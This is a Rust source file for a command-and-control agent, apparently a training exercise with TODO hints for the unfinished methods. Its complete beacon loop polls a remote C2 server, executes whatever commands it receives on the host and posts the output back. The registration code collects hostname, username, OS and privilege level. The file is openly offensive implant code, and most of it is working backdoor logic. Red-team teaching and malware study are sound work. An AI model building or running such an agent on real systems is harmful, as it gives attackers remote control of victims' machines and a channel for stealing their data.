use log::{error, info, warn};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

use crate::services::command_executor::{AgentCommand, CommandResult};

// ============================================================================
// REQUEST/RESPONSE MODELS (Match C2 Server)
// ============================================================================

/// Register request sent to C2
#[derive(Debug, Serialize)]
struct RegisterRequest {
    agent_id: String,
    hostname: String,
    os: String,
    os_version: String,
    user: String,
    ip: String,
    privileges: String,
    version: String,
}

/// Register response from C2
#[derive(Debug, Deserialize)]
struct RegisterResponse {
    success: bool,
    message: String,
    beacon_interval: u64,
}

/// Beacon request to C2
#[derive(Debug, Serialize)]
struct BeaconRequest {
    agent_id: String,
}

/// Beacon response from C2
#[derive(Debug, Deserialize)]
struct BeaconResponse {
    commands: Vec<AgentCommand>,
}

/// Result submission request to C2
#[derive(Debug, Serialize)]
struct ResultRequest {
    agent_id: String,
    command_id: String,
    success: bool,
    output: String,
}

/// Result response from C2
#[derive(Debug, Deserialize)]
struct ResultResponse {
    success: bool,
}

// ============================================================================
// C2 CLIENT
// ============================================================================

/// C2 client for agent-server communication
pub struct C2Client {
    c2_url: String,
    agent_id: String,
    http_client: Client,
}

impl C2Client {
    /// Create a new C2 client
    pub fn new(c2_url: String, agent_id: String) -> Self {
        // Build HTTP client with timeout
        let http_client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .expect("Failed to build HTTP client");

        Self {
            c2_url,
            agent_id,
            http_client,
        }
    }

    /// Register agent with C2 server
    ///
    /// **YOUR TASK:** Implement this!
    ///
    /// **What it should do:**
    /// 1. Gather system information
    /// 2. Create RegisterRequest
    /// 3. POST to /api/register
    /// 4. Return beacon_interval on success
    ///
    /// **HINTS:**
    /// - Use self.http_client.post()
    /// - URL: format!("{}/api/register", self.c2_url)
    /// - Use .json(&request) to send JSON
    /// - Use .send().await? to execute
    /// - Parse response: .json::<RegisterResponse>().await?
    pub async fn register(&self) -> Result<u64, Box<dyn std::error::Error>> {
        info!("Registering with C2 server: {}", self.c2_url);

        // TODO: Gather system information
        // HINT:
        // let hostname = hostname::get()?.to_string_lossy().to_string();
        // let username = whoami::username();
        // let os = std::env::consts::OS.to_string();

        // TODO: Create register request
        // HINT:
        // let request = RegisterRequest {
        //     agent_id: self.agent_id.clone(),
        //     hostname,
        //     os,
        //     os_version: "Unknown".to_string(),
        //     user: username,
        //     ip: "0.0.0.0".to_string(),  // TODO: Get real IP
        //     privileges: "user".to_string(),  // TODO: Detect privileges
        //     version: env!("CARGO_PKG_VERSION").to_string(),
        // };

        // TODO: Send registration request
        // HINT:
        // let url = format!("{}/api/register", self.c2_url);
        // let response = self.http_client
        //     .post(&url)
        //     .json(&request)
        //     .send()
        //     .await?;
        //
        // let register_response: RegisterResponse = response.json().await?;

        // TODO: Return beacon interval
        // HINT:
        // if register_response.success {
        //     info!("Registration successful: {}", register_response.message);
        //     Ok(register_response.beacon_interval)
        // } else {
        //     Err("Registration failed".into())
        // }

        // TEMPORARY - Replace with your implementation
        Ok(10) // Default 10 second interval
    }

    /// Beacon to C2 and get pending commands
    ///
    /// **YOUR TASK:** Implement this!
    ///
    /// **What it should do:**
    /// 1. Create BeaconRequest with agent_id
    /// 2. POST to /api/beacon
    /// 3. Return list of commands
    ///
    /// **HINTS:**
    /// - Similar to register()
    /// - URL: format!("{}/api/beacon", self.c2_url)
    /// - Response type: BeaconResponse
    /// - Return: response.commands
    pub async fn beacon(&self) -> Result<Vec<AgentCommand>, Box<dyn std::error::Error>> {
        info!("Beaconing to C2");

        // TODO: Create beacon request
        // HINT:
        // let request = BeaconRequest {
        //     agent_id: self.agent_id.clone(),
        // };

        // TODO: Send beacon request
        // HINT:
        // let url = format!("{}/api/beacon", self.c2_url);
        // let response = self.http_client
        //     .post(&url)
        //     .json(&request)
        //     .send()
        //     .await?;
        //
        // let beacon_response: BeaconResponse = response.json().await?;

        // TODO: Log and return commands
        // HINT:
        // if !beacon_response.commands.is_empty() {
        //     info!("Received {} command(s)", beacon_response.commands.len());
        // }
        // Ok(beacon_response.commands)

        // TEMPORARY - Replace with your implementation
        Ok(Vec::new())
    }

    /// Send command result to C2
    pub async fn send_result(&self, result: CommandResult) -> Result<(), Box<dyn std::error::Error>> {
        info!("Sending result for command: {}", result.command_id);

        let request = ResultRequest {
            agent_id: result.agent_id,
            command_id: result.command_id,
            success: result.success,
            output: result.output,
        };

        let url = format!("{}/api/result", self.c2_url);
        let response = self.http_client
            .post(&url)
            .json(&request)
            .send()
            .await?;

        let result_response: ResultResponse = response.json().await?;

        if result_response.success {
            info!("Result submitted successfully");
            Ok(())
        } else {
            Err("Failed to submit result".into())
        }
    }

    /// Beacon loop - runs continuously
    ///
    /// **THIS IS COMPLETE** - Study how it works!
    ///
    /// **What it does:**
    /// 1. Beacons every `interval` seconds
    /// 2. Executes any commands received
    /// 3. Sends results back
    /// 4. Handles errors gracefully
    pub async fn beacon_loop(&self, interval: u64) {
        info!("Starting beacon loop (interval: {}s)", interval);

        loop {
            // Beacon to C2
            match self.beacon().await {
                Ok(commands) => {
                    // Execute each command
                    for cmd in commands {
                        info!("Executing command: {}", cmd.id);

                        // Execute command
                        let result = crate::services::command_executor::execute_command(
                            cmd,
                            self.agent_id.clone(),
                        );

                        // Send result back
                        if let Err(e) = self.send_result(result).await {
                            error!("Failed to send result: {}", e);
                        }
                    }
                }
                Err(e) => {
                    warn!("Beacon failed: {}. Will retry...", e);
                }
            }

            // Sleep before next beacon
            tokio::time::sleep(Duration::from_secs(interval)).await;
        }
    }
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Generate unique agent ID
pub fn generate_agent_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let hostname = hostname::get()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    format!("{}_{}", hostname, timestamp)
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_agent_id_generation() {
        let id = generate_agent_id();
        assert!(!id.is_empty());
        assert!(id.contains("_"));
    }

    // Integration tests would go here
    // Requires C2 server running
}
